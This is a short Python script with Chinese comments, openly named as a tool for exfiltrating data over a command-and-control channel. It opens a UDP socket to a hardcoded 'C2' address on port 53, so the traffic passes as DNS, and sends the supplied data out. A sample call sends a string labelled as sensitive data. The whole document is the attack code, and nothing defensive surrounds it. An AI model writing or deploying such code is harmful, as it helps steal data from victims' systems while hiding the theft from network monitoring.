import socket

def exfiltration_over_c2(data):
    c2_ip = "192.168.1.100"
    c2_port = 53

    # 連接到 C2 伺服器
    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    c2_socket.connect((c2_ip, c2_port))

    # 編輯 DNS 查詢或回應的 payload，將資料藏在其中並透過 C2 傳送
    c2_socket.sendall(data.encode())

    # 關閉連接
    c2_socket.close()

# 測試範例
data = "Sensitive data to exfiltrate"
exfiltration_over_c2(data)